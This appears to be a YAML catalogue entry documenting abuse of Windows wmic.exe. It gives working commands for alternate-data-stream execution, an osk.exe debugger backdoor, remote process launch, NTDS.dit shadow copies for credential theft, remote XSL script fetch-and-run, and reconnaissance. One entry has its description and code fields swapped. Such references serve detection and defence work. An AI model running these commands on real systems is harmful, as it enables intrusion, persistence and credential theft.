---
name: wmic.exe
description: Used in Windows to perform queries and commands against WMI
functions:
  ads:
    - description: Execute a .EXE file stored as an Alternate Data Stream (ADS).
      code: wmic.exe process call create "c:\ads\file.txt:program.exe"
  execute:
    - description: Execute calc.exe.
      code: wmic.exe process call create calc
    - description: Add cmd.exe as a debugger for the osk.exe process. Each time osk.exe is run, cmd.exe will be run as well.
      code: wmic.exe /user:<username> /password:<password> /node:<computer_name> process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
    - description: Execute evil.exe on the remote system.
      code: wmic.exe /node:"192.168.0.1" process call create "evil.exe"
    - description: Create a scheduled execution of C:\GoogleUpdate.exe to run at 9pm.
      code: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"
    - description: Create a volume shadow copy of NTDS.dit that can be copied.
      code: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
    - description: Execute a script contained in the target .XSL file hosted on a remote server.
      code: wmic.exe process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
    - description: Executes JScript or VBScript embedded in the target XSL stylesheet.
      code: wmic.exe os get /format:"MYXSLFILE.xsl"
    - description: Executes JScript or VBScript embedded in the target remote XSL stylsheet.
      code: wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
  reconnaissance:
    - description: List the user accounts on the machine.
      code: wmic.exe useraccount get /ALL
    - description: Gets the command line used to execute a running program.
      code: wmic.exe process get caption,executablepath,commandline
    - description: wmic.exe qfe get description,installedOn /format:csv
      code: Gets a list of installed Windows updates.
    - description: Check to see if the target system is running SQL.
      code: wmic.exe /node:"192.168.0.1" service where (caption like "%sql server (%")
resources: 
    - resource: https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
    - resource: https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html
    - resource: https://twitter.com/subTee/status/986234811944648707
fullpath: 
    - path: c:\windows\system32\wbem\wmic.exe
    - path: c:\windows\sysWOW64\wbem\wmic.exe
notes:
---